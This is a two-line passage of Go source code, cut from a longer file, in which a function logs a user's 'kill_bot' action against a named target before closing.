	logger.LogUserAction(s.user.Username, fmt.Sprintf("kill_bot %s", target))
}
